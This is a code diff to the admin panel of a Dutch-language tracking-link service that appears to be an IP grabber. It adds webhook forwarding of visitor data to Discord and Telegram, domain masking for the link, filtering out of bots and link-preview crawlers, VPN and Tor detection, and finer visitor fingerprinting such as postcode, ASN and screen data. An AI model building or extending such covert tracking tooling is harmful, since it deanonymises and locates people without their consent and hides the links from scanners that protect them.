@@ -371,16 +371,49 @@
         <label for="destination">Doel-URL (https://)</label>
         <input type="text" id="destination" value="https://" placeholder="https://voorbeeld.nl">
       </div>
+
+      <!-- Advanced Options Toggle -->
       <div class="field">
-        <label for="domainPreset">Domein</label>
-        <select id="domainPreset">
-          <option value="current">Gebruik huidig domein</option>
-          <option value="custom">Eigen domein</option>
-        </select>
+        <button type="button" id="toggleAdvanced" class="btn btn-secondary btn-sm" style="width:100%;">
+          ⚙️ Geavanceerde opties
+        </button>
       </div>
-      <div id="customDomainWrapper" class="field" style="display:none;">
-        <label for="domain">Eigen domeinnaam</label>
-        <input type="text" id="domain" value="https://" placeholder="https://mijndomein.nl">
+
+      <div id="advancedOptions" style="display:none;">
+        <div class="field">
+          <label for="discordWebhook">Discord Webhook URL</label>
+          <input type="text" id="discordWebhook" placeholder="https://discord.com/api/webhooks/...">
+        </div>
+        <div class="field">
+          <label for="telegramWebhook">Telegram Bot URL</label>
+          <input type="text" id="telegramWebhook" placeholder="https://api.telegram.org/bot.../sendMessage">
+        </div>
+        <div class="field">
+          <label for="customWebhook">Custom Webhook URL</label>
+          <input type="text" id="customWebhook" placeholder="https://yourserver.com/webhook">
+        </div>
+        <div class="field">
+          <label for="alternativeDomain">Alternatief domein (voor masking)</label>
+          <input type="text" id="alternativeDomain" placeholder="https://alternative-domain.com">
+        </div>
+        <div class="field">
+          <label for="customLandingPage">Custom landing page URL</label>
+          <input type="text" id="customLandingPage" placeholder="https://yourpage.com/custom">
+        </div>
+        <div class="field">
+          <label>Bot Filtering</label>
+          <div style="display:flex; gap:12px; flex-wrap:wrap;">
+            <label style="display:flex; align-items:center; gap:6px; margin:0;">
+              <input type="checkbox" id="filterBots" checked> Bots
+            </label>
+            <label style="display:flex; align-items:center; gap:6px; margin:0;">
+              <input type="checkbox" id="filterSearchEngines" checked> Search Engines
+            </label>
+            <label style="display:flex; align-items:center; gap:6px; margin:0;">
+              <input type="checkbox" id="filterSocialMedia" checked> Social Media
+            </label>
+          </div>
+        </div>
       </div>
 
       <button class="btn btn-primary" id="generateBtn">
@@ -421,11 +454,11 @@
           <tr>
             <th>Naam</th><th>Tijd</th><th>Tracker ID</th>
             <th>IP</th><th>Land</th><th>Stad</th>
-            <th>Browser / OS</th><th>Actie</th>
+            <th>Browser / OS</th><th>Security</th><th>Actie</th>
           </tr>
         </thead>
         <tbody id="logsBody">
-          <tr><td colspan="8"><div class="skeleton"></div></td></tr>
+          <tr><td colspan="9"><div class="skeleton"></div></td></tr>
         </tbody>
       </table>
     </div>
@@ -579,10 +612,10 @@
     toastTimer = setTimeout(() => { el.className = 'toast'; }, 3000);
   }
 
-  // ── Domein-selector ────────────────────────────────────────────────────────
-  document.getElementById('domainPreset').addEventListener('change', function () {
-    document.getElementById('customDomainWrapper').style.display =
-      this.value === 'custom' ? '' : 'none';
+  // ── Advanced options toggle ──────────────────────────────────────────────────
+  document.getElementById('toggleAdvanced').addEventListener('click', function () {
+    const advanced = document.getElementById('advancedOptions');
+    advanced.style.display = advanced.style.display === 'none' ? '' : 'none';
   });
 
   document.getElementById('logoutBtn').addEventListener('click', logout);
@@ -599,8 +632,14 @@
   async function generateLink() {
     const name        = document.getElementById('name').value.trim();
     const destination = document.getElementById('destination').value.trim();
-    const preset      = document.getElementById('domainPreset').value;
-    const customDomain = document.getElementById('domain').value.trim();
+    const discordWebhook = document.getElementById('discordWebhook').value.trim();
+    const telegramWebhook = document.getElementById('telegramWebhook').value.trim();
+    const customWebhook = document.getElementById('customWebhook').value.trim();
+    const alternativeDomain = document.getElementById('alternativeDomain').value.trim();
+    const customLandingPage = document.getElementById('customLandingPage').value.trim();
+    const filterBots = document.getElementById('filterBots').checked;
+    const filterSearchEngines = document.getElementById('filterSearchEngines').checked;
+    const filterSocialMedia = document.getElementById('filterSocialMedia').checked;
 
     if (!name || !destination) {
       showToast('Vul naam en doel-URL in.', 'error'); return;
@@ -613,8 +652,8 @@
     btn.disabled = true;
     btn.textContent = 'Bezig…';
 
-    const base = preset === 'custom' && customDomain
-      ? customDomain.replace(/\/$/, '')
+    const base = alternativeDomain && alternativeDomain.startsWith('https://')
+      ? alternativeDomain.replace(/\/$/, '')
       : window.location.origin;
 
     try {
@@ -622,7 +661,18 @@
         method:  'POST',
         credentials: 'same-origin',
         headers: { 'Content-Type': 'application/json' },
-        body:    JSON.stringify({ name, destination_url: destination })
+        body:    JSON.stringify({
+          name,
+          destination_url: destination,
+          discord_webhook: discordWebhook || null,
+          telegram_webhook: telegramWebhook || null,
+          custom_webhook: customWebhook || null,
+          alternative_domain: alternativeDomain || null,
+          custom_landing_page: customLandingPage || null,
+          filter_bots: filterBots,
+          filter_search_engines: filterSearchEngines,
+          filter_social_media: filterSocialMedia
+        })
       });
       const data = await res.json();
 
@@ -838,7 +888,7 @@ async function loadTrackersList() {
 
   async function loadLogs() {
     const tbody = document.getElementById('logsBody');
-    tbody.innerHTML = '<tr><td colspan="8"><div class="skeleton"></div></td></tr>';
+    tbody.innerHTML = '<tr><td colspan="9"><div class="skeleton"></div></td></tr>';
 
     try {
       const res  = await fetch('/api/logs?limit=500&offset=0', { credentials: 'same-origin' });
@@ -851,7 +901,7 @@ async function loadTrackersList() {
       if (!logs.length) {
         const row = document.createElement('tr');
         const td  = document.createElement('td');
-        td.setAttribute('colspan', '8');
+        td.setAttribute('colspan', '9');
         td.style.cssText = 'color:var(--muted);text-align:center;padding:20px;';
         td.textContent   = 'Nog geen logs beschikbaar.';
         row.appendChild(td);
@@ -862,6 +912,14 @@ async function loadTrackersList() {
       logs.forEach((log, idx) => {
         const row = document.createElement('tr');
 
+        // Build security flags string
+        const securityFlags = [];
+        if (log.is_vpn) securityFlags.push('🔒 VPN');
+        if (log.is_proxy) securityFlags.push('🛡️ Proxy');
+        if (log.is_tor) securityFlags.push('🧅 Tor');
+        if (log.is_datacenter) securityFlags.push('🏢 DC');
+        const securityStr = securityFlags.length > 0 ? securityFlags.join(' ') : '-';
+
         const cells = [
           log.name        || 'Onbekend',
           new Date(log.timestamp).toLocaleString('nl-NL'),
@@ -869,7 +927,8 @@ async function loadTrackersList() {
           log.ip,
           log.country,
           log.city,
-          `${log.browser} / ${log.os}`
+          `${log.browser} / ${log.os}`,
+          securityStr
         ];
 
         cells.forEach(val => {
@@ -896,7 +955,7 @@ async function loadTrackersList() {
       tbody.innerHTML = '';
       const row = document.createElement('tr');
       const td  = document.createElement('td');
-      td.setAttribute('colspan', '8');
+      td.setAttribute('colspan', '9');
       td.style.color = 'var(--red)';
       td.textContent = 'Fout bij laden van logs.';
       row.appendChild(td);
@@ -922,14 +981,23 @@ async function loadTrackersList() {
       ['Tracker ID',       log.tracker_id],
       ['IP-adres',         log.ip],
       ['Land',             log.country],
+      ['Regio',            log.region || '—'],
       ['Stad',             log.city],
+      ['Postcode',         log.zip_code || '—'],
       ['ISP',              log.isp],
+      ['ASN',              log.asn || '—'],
       ['Tijdstip',         new Date(log.timestamp).toLocaleString('nl-NL')],
       ['Browser',          log.browser],
       ['Besturingssysteem',log.os],
       ['Apparaat',         log.device],
+      ['Screen Resolutie', log.screen_resolution || '—'],
+      ['Color Depth',      log.color_depth || '—'],
       ['User Agent',       log.useragent],
       ['Referer',          log.referer],
+      ['VPN',              log.is_vpn ? '✅ Ja' : '❌ Nee'],
+      ['Proxy',            log.is_proxy ? '✅ Ja' : '❌ Nee'],
+      ['Tor',              log.is_tor ? '✅ Ja' : '❌ Nee'],
+      ['Datacenter',       log.is_datacenter ? '✅ Ja' : '❌ Nee'],
     ];
 
     items.forEach(([label, value]) => {
